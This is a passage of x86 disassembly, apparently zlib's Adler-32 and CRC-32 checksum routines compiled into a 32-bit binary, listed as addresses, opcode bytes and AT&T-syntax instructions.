  408114:	b8 f0 ff 00 00       	mov    $0xfff0,%eax
  408119:	c1 ea 0f             	shr    $0xf,%edx
  40811c:	69 d2 f1 ff 00 00    	imul   $0xfff1,%edx,%edx
  408122:	29 d1                	sub    %edx,%ecx
  408124:	01 f9                	add    %edi,%ecx
  408126:	03 2c 24             	add    (%esp),%ebp
  408129:	8d 91 f1 ff 00 00    	lea    0xfff1(%ecx),%edx
  40812f:	74 10                	je     0x408141
  408131:	8d 45 ff             	lea    -0x1(%ebp),%eax
  408134:	3d f0 ff 00 00       	cmp    $0xfff0,%eax
  408139:	76 06                	jbe    0x408141
  40813b:	8d 85 0e 00 ff ff    	lea    -0xfff2(%ebp),%eax
  408141:	81 e9 f1 ff 00 00    	sub    $0xfff1,%ecx
  408147:	81 fa e2 ff 01 00    	cmp    $0x1ffe2,%edx
  40814d:	0f 43 d1             	cmovae %ecx,%edx
  408150:	8d 8a 0f 00 ff ff    	lea    -0xfff1(%edx),%ecx
  408156:	81 fa f1 ff 00 00    	cmp    $0xfff1,%edx
  40815c:	0f 43 d1             	cmovae %ecx,%edx
  40815f:	83 c4 04             	add    $0x4,%esp
  408162:	c1 e2 10             	shl    $0x10,%edx
  408165:	5b                   	pop    %ebx
  408166:	09 d0                	or     %edx,%eax
  408168:	5e                   	pop    %esi
  408169:	5f                   	pop    %edi
  40816a:	5d                   	pop    %ebp
  40816b:	c3                   	ret
  40816c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  408170:	55                   	push   %ebp
  408171:	57                   	push   %edi
  408172:	56                   	push   %esi
  408173:	53                   	push   %ebx
  408174:	83 ec 38             	sub    $0x38,%esp
  408177:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  40817b:	8b 4c 24 50          	mov    0x50(%esp),%ecx
  40817f:	89 c6                	mov    %eax,%esi
  408181:	0f b7 d8             	movzwl %ax,%ebx
  408184:	c1 ee 10             	shr    $0x10,%esi
  408187:	83 7c 24 54 01       	cmpl   $0x1,0x54(%esp)
  40818c:	89 74 24 2c          	mov    %esi,0x2c(%esp)
  408190:	0f 84 47 03 00 00    	je     0x4084dd
  408196:	85 c9                	test   %ecx,%ecx
  408198:	0f 84 72 03 00 00    	je     0x408510
  40819e:	83 7c 24 54 0f       	cmpl   $0xf,0x54(%esp)
  4081a3:	77 5d                	ja     0x408202
  4081a5:	8b 54 24 54          	mov    0x54(%esp),%edx
  4081a9:	85 d2                	test   %edx,%edx
  4081ab:	74 1d                	je     0x4081ca
  4081ad:	8b 54 24 54          	mov    0x54(%esp),%edx
  4081b1:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4081b5:	01 ca                	add    %ecx,%edx
  4081b7:	83 c1 01             	add    $0x1,%ecx
  4081ba:	0f b6 71 ff          	movzbl -0x1(%ecx),%esi
  4081be:	01 f3                	add    %esi,%ebx
  4081c0:	01 d8                	add    %ebx,%eax
  4081c2:	39 d1                	cmp    %edx,%ecx
  4081c4:	75 f1                	jne    0x4081b7
  4081c6:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4081ca:	8d 83 0f 00 ff ff    	lea    -0xfff1(%ebx),%eax
  4081d0:	81 fb f1 ff 00 00    	cmp    $0xfff1,%ebx
  4081d6:	ba 71 80 07 80       	mov    $0x80078071,%edx
  4081db:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  4081df:	0f 43 d8             	cmovae %eax,%ebx
  4081e2:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4081e6:	f7 e2                	mul    %edx
  4081e8:	c1 ea 0f             	shr    $0xf,%edx
  4081eb:	69 c2 f1 ff 00 00    	imul   $0xfff1,%edx,%eax
  4081f1:	29 c7                	sub    %eax,%edi
  4081f3:	89 f8                	mov    %edi,%eax
  4081f5:	c1 e0 10             	shl    $0x10,%eax
  4081f8:	09 d8                	or     %ebx,%eax
  4081fa:	83 c4 38             	add    $0x38,%esp
  4081fd:	5b                   	pop    %ebx
  4081fe:	5e                   	pop    %esi
  4081ff:	5f                   	pop    %edi
  408200:	5d                   	pop    %ebp
  408201:	c3                   	ret
  408202:	81 7c 24 54 af 15 00 	cmpl   $0x15af,0x54(%esp)
  408209:	00 
  40820a:	89 dd                	mov    %ebx,%ebp
  40820c:	89 c8                	mov    %ecx,%eax
  40820e:	0f 86 06 03 00 00    	jbe    0x40851a
  408214:	81 6c 24 54 b0 15 00 	subl   $0x15b0,0x54(%esp)
  40821b:	00 
  40821c:	8d b0 b0 15 00 00    	lea    0x15b0(%eax),%esi
  408222:	89 74 24 30          	mov    %esi,0x30(%esp)
  408226:	8d 76 00             	lea    0x0(%esi),%esi
  408229:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408230:	0f b6 10             	movzbl (%eax),%edx
  408233:	83 c0 10             	add    $0x10,%eax
  408236:	8d 7c 15 00          	lea    0x0(%ebp,%edx,1),%edi
  40823a:	0f b6 50 f1          	movzbl -0xf(%eax),%edx
  40823e:	89 3c 24             	mov    %edi,(%esp)
  408241:	01 fa                	add    %edi,%edx
  408243:	89 d7                	mov    %edx,%edi
  408245:	0f b6 50 f2          	movzbl -0xe(%eax),%edx
  408249:	89 7c 24 04          	mov    %edi,0x4(%esp)
  40824d:	89 d6                	mov    %edx,%esi
  40824f:	0f b6 50 f3          	movzbl -0xd(%eax),%edx
  408253:	01 fe                	add    %edi,%esi
  408255:	89 74 24 08          	mov    %esi,0x8(%esp)
  408259:	89 d3                	mov    %edx,%ebx
  40825b:	0f b6 50 f4          	movzbl -0xc(%eax),%edx
  40825f:	01 f3                	add    %esi,%ebx
  408261:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  408265:	89 d1                	mov    %edx,%ecx
  408267:	0f b6 50 f5          	movzbl -0xb(%eax),%edx
  40826b:	01 d9                	add    %ebx,%ecx
  40826d:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  408271:	89 d5                	mov    %edx,%ebp
  408273:	0f b6 50 f6          	movzbl -0xa(%eax),%edx
  408277:	01 cd                	add    %ecx,%ebp
  408279:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  40827d:	01 ea                	add    %ebp,%edx
  40827f:	0f b6 68 ff          	movzbl -0x1(%eax),%ebp
  408283:	89 d7                	mov    %edx,%edi
  408285:	0f b6 50 f7          	movzbl -0x9(%eax),%edx
  408289:	89 7c 24 18          	mov    %edi,0x18(%esp)
  40828d:	01 fa                	add    %edi,%edx
  40828f:	0f b6 78 fb          	movzbl -0x5(%eax),%edi
  408293:	89 d6                	mov    %edx,%esi
  408295:	0f b6 50 f8          	movzbl -0x8(%eax),%edx
  408299:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  40829d:	01 f2                	add    %esi,%edx
  40829f:	0f b6 70 fc          	movzbl -0x4(%eax),%esi
  4082a3:	89 d3                	mov    %edx,%ebx
  4082a5:	0f b6 50 f9          	movzbl -0x7(%eax),%edx
  4082a9:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4082ad:	01 da                	add    %ebx,%edx
  4082af:	0f b6 58 fd          	movzbl -0x3(%eax),%ebx
  4082b3:	89 d1                	mov    %edx,%ecx
  4082b5:	0f b6 50 fa          	movzbl -0x6(%eax),%edx
  4082b9:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  4082bd:	01 ca                	add    %ecx,%edx
  4082bf:	0f b6 48 fe          	movzbl -0x2(%eax),%ecx
  4082c3:	01 d7                	add    %edx,%edi
  4082c5:	89 54 24 28          	mov    %edx,0x28(%esp)
  4082c9:	8b 54 24 04          	mov    0x4(%esp),%edx
  4082cd:	03 14 24             	add    (%esp),%edx
  4082d0:	01 fe                	add    %edi,%esi
  4082d2:	03 54 24 08          	add    0x8(%esp),%edx
  4082d6:	01 f3                	add    %esi,%ebx
  4082d8:	03 54 24 0c          	add    0xc(%esp),%edx
  4082dc:	01 d9                	add    %ebx,%ecx
  4082de:	03 54 24 10          	add    0x10(%esp),%edx
  4082e2:	01 cd                	add    %ecx,%ebp
  4082e4:	03 54 24 14          	add    0x14(%esp),%edx
  4082e8:	03 54 24 18          	add    0x18(%esp),%edx
  4082ec:	03 54 24 1c          	add    0x1c(%esp),%edx
  4082f0:	03 54 24 20          	add    0x20(%esp),%edx
  4082f4:	03 54 24 24          	add    0x24(%esp),%edx
  4082f8:	03 54 24 28          	add    0x28(%esp),%edx
  4082fc:	01 fa                	add    %edi,%edx
  4082fe:	01 f2                	add    %esi,%edx
  408300:	01 d3                	add    %edx,%ebx
  408302:	01 d9                	add    %ebx,%ecx
  408304:	01 e9                	add    %ebp,%ecx
  408306:	01 4c 24 2c          	add    %ecx,0x2c(%esp)
  40830a:	3b 44 24 30          	cmp    0x30(%esp),%eax
  40830e:	0f 85 1c ff ff ff    	jne    0x408230
  408314:	b8 71 80 07 80       	mov    $0x80078071,%eax
  408319:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  40831d:	f7 e5                	mul    %ebp
  40831f:	c1 ea 0f             	shr    $0xf,%edx
  408322:	69 c2 f1 ff 00 00    	imul   $0xfff1,%edx,%eax
  408328:	29 c5                	sub    %eax,%ebp
  40832a:	b8 71 80 07 80       	mov    $0x80078071,%eax
  40832f:	f7 e7                	mul    %edi
  408331:	c1 ea 0f             	shr    $0xf,%edx
  408334:	69 c2 f1 ff 00 00    	imul   $0xfff1,%edx,%eax
  40833a:	29 c7                	sub    %eax,%edi
  40833c:	81 7c 24 54 af 15 00 	cmpl   $0x15af,0x54(%esp)
  408343:	00 
  408344:	8b 44 24 30          	mov    0x30(%esp),%eax
  408348:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  40834c:	0f 87 c2 fe ff ff    	ja     0x408214
  408352:	8b 44 24 54          	mov    0x54(%esp),%eax
  408356:	89 eb                	mov    %ebp,%ebx
  408358:	85 c0                	test   %eax,%eax
  40835a:	0f 84 6c 01 00 00    	je     0x4084cc
  408360:	83 7c 24 54 0f       	cmpl   $0xf,0x54(%esp)
  408365:	0f 86 b8 01 00 00    	jbe    0x408523
  40836b:	8b 44 24 54          	mov    0x54(%esp),%eax
  40836f:	8b 54 24 30          	mov    0x30(%esp),%edx
  408373:	89 44 24 04          	mov    %eax,0x4(%esp)
  408377:	0f b6 02             	movzbl (%edx),%eax
  40837a:	83 6c 24 04 10       	subl   $0x10,0x4(%esp)
  40837f:	83 c2 10             	add    $0x10,%edx
  408382:	8d 34 03             	lea    (%ebx,%eax,1),%esi
  408385:	0f b6 42 f1          	movzbl -0xf(%edx),%eax
  408389:	89 74 24 08          	mov    %esi,0x8(%esp)
  40838d:	01 f0                	add    %esi,%eax
  40838f:	89 c6                	mov    %eax,%esi
  408391:	0f b6 42 f2          	movzbl -0xe(%edx),%eax
  408395:	89 74 24 0c          	mov    %esi,0xc(%esp)
  408399:	89 c7                	mov    %eax,%edi
  40839b:	0f b6 42 f3          	movzbl -0xd(%edx),%eax
  40839f:	01 f7                	add    %esi,%edi
  4083a1:	89 7c 24 10          	mov    %edi,0x10(%esp)
  4083a5:	89 c1                	mov    %eax,%ecx
  4083a7:	0f b6 42 f4          	movzbl -0xc(%edx),%eax
  4083ab:	01 f9                	add    %edi,%ecx
  4083ad:	0f b6 7a f9          	movzbl -0x7(%edx),%edi
  4083b1:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  4083b5:	89 c3                	mov    %eax,%ebx
  4083b7:	0f b6 42 f5          	movzbl -0xb(%edx),%eax
  4083bb:	01 cb                	add    %ecx,%ebx
  4083bd:	0f b6 4a fb          	movzbl -0x5(%edx),%ecx
  4083c1:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  4083c5:	89 c5                	mov    %eax,%ebp
  4083c7:	0f b6 42 f6          	movzbl -0xa(%edx),%eax
  4083cb:	01 dd                	add    %ebx,%ebp
  4083cd:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  4083d1:	89 c6                	mov    %eax,%esi
  4083d3:	0f b6 42 f7          	movzbl -0x9(%edx),%eax
  4083d7:	01 ee                	add    %ebp,%esi
  4083d9:	0f b6 6a f8          	movzbl -0x8(%edx),%ebp
  4083dd:	89 74 24 20          	mov    %esi,0x20(%esp)
  4083e1:	01 f0                	add    %esi,%eax
  4083e3:	0f b6 72 fa          	movzbl -0x6(%edx),%esi
  4083e7:	01 c5                	add    %eax,%ebp
  4083e9:	89 44 24 24          	mov    %eax,0x24(%esp)
  4083ed:	0f b6 42 fc          	movzbl -0x4(%edx),%eax
  4083f1:	01 ef                	add    %ebp,%edi
  4083f3:	01 fe                	add    %edi,%esi
  4083f5:	01 f1                	add    %esi,%ecx
  4083f7:	8d 1c 01             	lea    (%ecx,%eax,1),%ebx
  4083fa:	0f b6 42 fd          	movzbl -0x3(%edx),%eax
  4083fe:	89 1c 24             	mov    %ebx,(%esp)
  408401:	8b 1c 24             	mov    (%esp),%ebx
  408404:	01 c3                	add    %eax,%ebx
  408406:	0f b6 42 fe          	movzbl -0x2(%edx),%eax
  40840a:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  40840e:	01 d8                	add    %ebx,%eax
  408410:	0f b6 5a ff          	movzbl -0x1(%edx),%ebx
  408414:	89 44 24 34          	mov    %eax,0x34(%esp)
  408418:	01 c3                	add    %eax,%ebx
  40841a:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40841e:	03 44 24 08          	add    0x8(%esp),%eax
  408422:	03 44 24 10          	add    0x10(%esp),%eax
  408426:	03 44 24 14          	add    0x14(%esp),%eax
  40842a:	03 44 24 18          	add    0x18(%esp),%eax
  40842e:	03 44 24 1c          	add    0x1c(%esp),%eax
  408432:	03 44 24 20          	add    0x20(%esp),%eax
  408436:	03 44 24 24          	add    0x24(%esp),%eax
  40843a:	01 e8                	add    %ebp,%eax
  40843c:	01 f8                	add    %edi,%eax
  40843e:	01 f0                	add    %esi,%eax
  408440:	01 c8                	add    %ecx,%eax
  408442:	03 04 24             	add    (%esp),%eax
  408445:	03 44 24 28          	add    0x28(%esp),%eax
  408449:	03 44 24 34          	add    0x34(%esp),%eax
  40844d:	01 d8                	add    %ebx,%eax
  40844f:	01 44 24 2c          	add    %eax,0x2c(%esp)
  408453:	83 7c 24 04 0f       	cmpl   $0xf,0x4(%esp)
  408458:	0f 87 19 ff ff ff    	ja     0x408377
  40845e:	8b 44 24 54          	mov    0x54(%esp),%eax
  408462:	8b 74 24 30          	mov    0x30(%esp),%esi
  408466:	8b 54 24 54          	mov    0x54(%esp),%edx
  40846a:	83 e8 10             	sub    $0x10,%eax
  40846d:	83 e0 f0             	and    $0xfffffff0,%eax
  408470:	83 e2 0f             	and    $0xf,%edx
  408473:	8d 44 06 10          	lea    0x10(%esi,%eax,1),%eax
  408477:	85 d2                	test   %edx,%edx
  408479:	89 44 24 30          	mov    %eax,0x30(%esp)
  40847d:	8d 42 ff             	lea    -0x1(%edx),%eax
  408480:	74 21                	je     0x4084a3
  408482:	8b 7c 24 30          	mov    0x30(%esp),%edi
  408486:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  40848a:	8d 54 07 01          	lea    0x1(%edi,%eax,1),%edx
  40848e:	89 f8                	mov    %edi,%eax
  408490:	83 c0 01             	add    $0x1,%eax
  408493:	0f b6 70 ff          	movzbl -0x1(%eax),%esi
  408497:	01 f3                	add    %esi,%ebx
  408499:	01 d9                	add    %ebx,%ecx
  40849b:	39 d0                	cmp    %edx,%eax
  40849d:	75 f1                	jne    0x408490
  40849f:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  4084a3:	89 d8                	mov    %ebx,%eax
  4084a5:	b9 71 80 07 80       	mov    $0x80078071,%ecx
  4084aa:	f7 e1                	mul    %ecx
  4084ac:	89 d0                	mov    %edx,%eax
  4084ae:	c1 e8 0f             	shr    $0xf,%eax
  4084b1:	69 c0 f1 ff 00 00    	imul   $0xfff1,%eax,%eax
  4084b7:	29 c3                	sub    %eax,%ebx
  4084b9:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4084bd:	f7 e1                	mul    %ecx
  4084bf:	c1 ea 0f             	shr    $0xf,%edx
  4084c2:	69 c2 f1 ff 00 00    	imul   $0xfff1,%edx,%eax
  4084c8:	29 44 24 2c          	sub    %eax,0x2c(%esp)
  4084cc:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4084d0:	83 c4 38             	add    $0x38,%esp
  4084d3:	c1 e0 10             	shl    $0x10,%eax
  4084d6:	09 d8                	or     %ebx,%eax
  4084d8:	5b                   	pop    %ebx
  4084d9:	5e                   	pop    %esi
  4084da:	5f                   	pop    %edi
  4084db:	5d                   	pop    %ebp
  4084dc:	c3                   	ret
  4084dd:	0f b6 01             	movzbl (%ecx),%eax
  4084e0:	01 d8                	add    %ebx,%eax
  4084e2:	8d 90 0f 00 ff ff    	lea    -0xfff1(%eax),%edx
  4084e8:	3d f1 ff 00 00       	cmp    $0xfff1,%eax
  4084ed:	0f 43 c2             	cmovae %edx,%eax
  4084f0:	89 f2                	mov    %esi,%edx
  4084f2:	01 c2                	add    %eax,%edx
  4084f4:	8d 8a 0f 00 ff ff    	lea    -0xfff1(%edx),%ecx
  4084fa:	81 fa f1 ff 00 00    	cmp    $0xfff1,%edx
  408500:	0f 43 d1             	cmovae %ecx,%edx
  408503:	83 c4 38             	add    $0x38,%esp
  408506:	c1 e2 10             	shl    $0x10,%edx
  408509:	5b                   	pop    %ebx
  40850a:	09 d0                	or     %edx,%eax
  40850c:	5e                   	pop    %esi
  40850d:	5f                   	pop    %edi
  40850e:	5d                   	pop    %ebp
  40850f:	c3                   	ret
  408510:	b8 01 00 00 00       	mov    $0x1,%eax
  408515:	e9 e0 fc ff ff       	jmp    0x4081fa
  40851a:	89 4c 24 30          	mov    %ecx,0x30(%esp)
  40851e:	e9 48 fe ff ff       	jmp    0x40836b
  408523:	8b 44 24 54          	mov    0x54(%esp),%eax
  408527:	83 e8 01             	sub    $0x1,%eax
  40852a:	e9 53 ff ff ff       	jmp    0x408482
  40852f:	90                   	nop
  408530:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  408534:	8b 44 24 04          	mov    0x4(%esp),%eax
  408538:	8b 54 24 08          	mov    0x8(%esp),%edx
  40853c:	85 c9                	test   %ecx,%ecx
  40853e:	78 05                	js     0x408545
  408540:	e9 8b fb ff ff       	jmp    0x4080d0
  408545:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40854a:	c3                   	ret
  40854b:	90                   	nop
  40854c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  408550:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  408554:	8b 44 24 04          	mov    0x4(%esp),%eax
  408558:	8b 54 24 08          	mov    0x8(%esp),%edx
  40855c:	85 c9                	test   %ecx,%ecx
  40855e:	78 05                	js     0x408565
  408560:	e9 6b fb ff ff       	jmp    0x4080d0
  408565:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40856a:	c3                   	ret
  40856b:	90                   	nop
  40856c:	90                   	nop
  40856d:	90                   	nop
  40856e:	90                   	nop
  40856f:	90                   	nop
  408570:	57                   	push   %edi
  408571:	56                   	push   %esi
  408572:	31 ff                	xor    %edi,%edi
  408574:	53                   	push   %ebx
  408575:	8b 0c ba             	mov    (%edx,%edi,4),%ecx
  408578:	85 c9                	test   %ecx,%ecx
  40857a:	74 21                	je     0x40859d
  40857c:	89 d3                	mov    %edx,%ebx
  40857e:	31 f6                	xor    %esi,%esi
  408580:	f6 c1 01             	test   $0x1,%cl
  408583:	74 02                	je     0x408587
  408585:	33 33                	xor    (%ebx),%esi
  408587:	83 c3 04             	add    $0x4,%ebx
  40858a:	d1 e9                	shr    $1,%ecx
  40858c:	75 f2                	jne    0x408580
  40858e:	89 34 b8             	mov    %esi,(%eax,%edi,4)
  408591:	83 c7 01             	add    $0x1,%edi
  408594:	83 ff 20             	cmp    $0x20,%edi
  408597:	75 dc                	jne    0x408575
  408599:	5b                   	pop    %ebx
  40859a:	5e                   	pop    %esi
  40859b:	5f                   	pop    %edi
  40859c:	c3                   	ret
  40859d:	31 f6                	xor    %esi,%esi
  40859f:	89 34 b8             	mov    %esi,(%eax,%edi,4)
  4085a2:	83 c7 01             	add    $0x1,%edi
  4085a5:	83 ff 20             	cmp    $0x20,%edi
  4085a8:	75 cb                	jne    0x408575
  4085aa:	eb ed                	jmp    0x408599
  4085ac:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4085b0:	55                   	push   %ebp
  4085b1:	57                   	push   %edi
  4085b2:	89 cd                	mov    %ecx,%ebp
  4085b4:	56                   	push   %esi
  4085b5:	53                   	push   %ebx
  4085b6:	89 c6                	mov    %eax,%esi
  4085b8:	81 ec 00 01 00 00    	sub    $0x100,%esp
  4085be:	85 c9                	test   %ecx,%ecx
  4085c0:	0f 8e d0 00 00 00    	jle    0x408696
  4085c6:	8d 84 24 84 00 00 00 	lea    0x84(%esp),%eax
  4085cd:	8d 8c 24 00 01 00 00 	lea    0x100(%esp),%ecx
  4085d4:	89 d7                	mov    %edx,%edi
  4085d6:	c7 84 24 80 00 00 00 	movl   $0xedb88320,0x80(%esp)
  4085dd:	20 83 b8 ed 
  4085e1:	ba 01 00 00 00       	mov    $0x1,%edx
  4085e6:	8d 76 00             	lea    0x0(%esi),%esi
  4085e9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4085f0:	89 10                	mov    %edx,(%eax)
  4085f2:	83 c0 04             	add    $0x4,%eax
  4085f5:	01 d2                	add    %edx,%edx
  4085f7:	39 c8                	cmp    %ecx,%eax
  4085f9:	75 f5                	jne    0x4085f0
  4085fb:	8d 94 24 80 00 00 00 	lea    0x80(%esp),%edx
  408602:	89 e0                	mov    %esp,%eax
  408604:	e8 67 ff ff ff       	call   0x408570
  408609:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  408610:	89 e2                	mov    %esp,%edx
  408612:	e8 59 ff ff ff       	call   0x408570
  408617:	89 f6                	mov    %esi,%esi
  408619:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408620:	8d 94 24 80 00 00 00 	lea    0x80(%esp),%edx
  408627:	89 e0                	mov    %esp,%eax
  408629:	e8 42 ff ff ff       	call   0x408570
  40862e:	f7 c5 01 00 00 00    	test   $0x1,%ebp
  408634:	74 18                	je     0x40864e
  408636:	85 f6                	test   %esi,%esi
  408638:	74 14                	je     0x40864e
  40863a:	89 f3                	mov    %esi,%ebx
  40863c:	89 e0                	mov    %esp,%eax
  40863e:	31 f6                	xor    %esi,%esi
  408640:	f6 c3 01             	test   $0x1,%bl
  408643:	74 02                	je     0x408647
  408645:	33 30                	xor    (%eax),%esi
  408647:	83 c0 04             	add    $0x4,%eax
  40864a:	d1 eb                	shr    $1,%ebx
  40864c:	75 f2                	jne    0x408640
  40864e:	d1 fd                	sar    $1,%ebp
  408650:	74 40                	je     0x408692
  408652:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  408659:	89 e2                	mov    %esp,%edx
  40865b:	e8 10 ff ff ff       	call   0x408570
  408660:	f7 c5 01 00 00 00    	test   $0x1,%ebp
  408666:	74 26                	je     0x40868e
  408668:	85 f6                	test   %esi,%esi
  40866a:	74 22                	je     0x40868e
  40866c:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  408673:	89 f3                	mov    %esi,%ebx
  408675:	31 f6                	xor    %esi,%esi
  408677:	89 f6                	mov    %esi,%esi
  408679:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408680:	f6 c3 01             	test   $0x1,%bl
  408683:	74 02                	je     0x408687
  408685:	33 30                	xor    (%eax),%esi
  408687:	83 c0 04             	add    $0x4,%eax
  40868a:	d1 eb                	shr    $1,%ebx
  40868c:	75 f2                	jne    0x408680
  40868e:	d1 fd                	sar    $1,%ebp
  408690:	75 8e                	jne    0x408620
  408692:	89 f0                	mov    %esi,%eax
  408694:	31 f8                	xor    %edi,%eax
  408696:	81 c4 00 01 00 00    	add    $0x100,%esp
  40869c:	5b                   	pop    %ebx
  40869d:	5e                   	pop    %esi
  40869e:	5f                   	pop    %edi
  40869f:	5d                   	pop    %ebp
  4086a0:	c3                   	ret
  4086a1:	eb 0d                	jmp    0x4086b0
  4086a3:	90                   	nop
  4086a4:	90                   	nop
  4086a5:	90                   	nop
  4086a6:	90                   	nop
  4086a7:	90                   	nop
  4086a8:	90                   	nop
  4086a9:	90                   	nop
  4086aa:	90                   	nop
  4086ab:	90                   	nop
  4086ac:	90                   	nop
  4086ad:	90                   	nop
  4086ae:	90                   	nop
  4086af:	90                   	nop
  4086b0:	b8 c0 e0 40 00       	mov    $0x40e0c0,%eax
  4086b5:	c3                   	ret
  4086b6:	8d 76 00             	lea    0x0(%esi),%esi
  4086b9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4086c0:	55                   	push   %ebp
  4086c1:	57                   	push   %edi
  4086c2:	56                   	push   %esi
  4086c3:	53                   	push   %ebx
  4086c4:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4086c8:	85 db                	test   %ebx,%ebx
  4086ca:	0f 84 b2 02 00 00    	je     0x408982
  4086d0:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4086d4:	8b 44 24 14          	mov    0x14(%esp),%eax
  4086d8:	85 c9                	test   %ecx,%ecx
  4086da:	f7 d0                	not    %eax
  4086dc:	74 31                	je     0x40870f
  4086de:	f6 c3 03             	test   $0x3,%bl
  4086e1:	74 41                	je     0x408724
  4086e3:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4086e7:	eb 0c                	jmp    0x4086f5
  4086e9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4086f0:	f6 c3 03             	test   $0x3,%bl
  4086f3:	74 2b                	je     0x408720
  4086f5:	83 c3 01             	add    $0x1,%ebx
  4086f8:	89 c2                	mov    %eax,%edx
  4086fa:	c1 e8 08             	shr    $0x8,%eax
  4086fd:	32 53 ff             	xor    -0x1(%ebx),%dl
  408700:	0f b6 d2             	movzbl %dl,%edx
  408703:	33 04 95 c0 e0 40 00 	xor    0x40e0c0(,%edx,4),%eax
  40870a:	83 e9 01             	sub    $0x1,%ecx
  40870d:	75 e1                	jne    0x4086f0
  40870f:	5b                   	pop    %ebx
  408710:	f7 d0                	not    %eax
  408712:	5e                   	pop    %esi
  408713:	5f                   	pop    %edi
  408714:	5d                   	pop    %ebp
  408715:	c3                   	ret
  408716:	8d 76 00             	lea    0x0(%esi),%esi
  408719:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408720:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  408724:	83 7c 24 1c 1f       	cmpl   $0x1f,0x1c(%esp)
  408729:	0f 86 ca 01 00 00    	jbe    0x4088f9
  40872f:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  408733:	89 d9                	mov    %ebx,%ecx
  408735:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  408739:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  408740:	33 01                	xor    (%ecx),%eax
  408742:	89 c5                	mov    %eax,%ebp
  408744:	0f b6 f8             	movzbl %al,%edi
  408747:	89 c2                	mov    %eax,%edx
  408749:	c1 ed 18             	shr    $0x18,%ebp
  40874c:	8b 3c bd c0 ec 40 00 	mov    0x40ecc0(,%edi,4),%edi
  408753:	c1 ea 10             	shr    $0x10,%edx
  408756:	33 3c ad c0 e0 40 00 	xor    0x40e0c0(,%ebp,4),%edi
  40875d:	0f b6 c4             	movzbl %ah,%eax
  408760:	0f b6 d2             	movzbl %dl,%edx
  408763:	33 79 04             	xor    0x4(%ecx),%edi
  408766:	33 3c 85 c0 e8 40 00 	xor    0x40e8c0(,%eax,4),%edi
  40876d:	8b 04 95 c0 e4 40 00 	mov    0x40e4c0(,%edx,4),%eax
  408774:	31 f8                	xor    %edi,%eax
  408776:	89 c2                	mov    %eax,%edx
  408778:	89 c5                	mov    %eax,%ebp
  40877a:	c1 ea 10             	shr    $0x10,%edx
  40877d:	c1 ed 18             	shr    $0x18,%ebp
  408780:	0f b6 fa             	movzbl %dl,%edi
  408783:	0f b6 d0             	movzbl %al,%edx
  408786:	0f b6 c4             	movzbl %ah,%eax
  408789:	8b 14 95 c0 ec 40 00 	mov    0x40ecc0(,%edx,4),%edx
  408790:	33 14 ad c0 e0 40 00 	xor    0x40e0c0(,%ebp,4),%edx
  408797:	33 51 08             	xor    0x8(%ecx),%edx
  40879a:	33 14 85 c0 e8 40 00 	xor    0x40e8c0(,%eax,4),%edx
  4087a1:	33 14 bd c0 e4 40 00 	xor    0x40e4c0(,%edi,4),%edx
  4087a8:	89 d0                	mov    %edx,%eax
  4087aa:	89 d5                	mov    %edx,%ebp
  4087ac:	c1 e8 10             	shr    $0x10,%eax
  4087af:	c1 ed 18             	shr    $0x18,%ebp
  4087b2:	0f b6 f8             	movzbl %al,%edi
  4087b5:	0f b6 c2             	movzbl %dl,%eax
  4087b8:	0f b6 d6             	movzbl %dh,%edx
  4087bb:	8b 04 85 c0 ec 40 00 	mov    0x40ecc0(,%eax,4),%eax
  4087c2:	33 04 ad c0 e0 40 00 	xor    0x40e0c0(,%ebp,4),%eax
  4087c9:	33 41 0c             	xor    0xc(%ecx),%eax
  4087cc:	33 04 95 c0 e8 40 00 	xor    0x40e8c0(,%edx,4),%eax
  4087d3:	33 04 bd c0 e4 40 00 	xor    0x40e4c0(,%edi,4),%eax
  4087da:	89 c2                	mov    %eax,%edx
  4087dc:	89 c5                	mov    %eax,%ebp
  4087de:	c1 ea 10             	shr    $0x10,%edx
  4087e1:	c1 ed 18             	shr    $0x18,%ebp
  4087e4:	0f b6 fa             	movzbl %dl,%edi
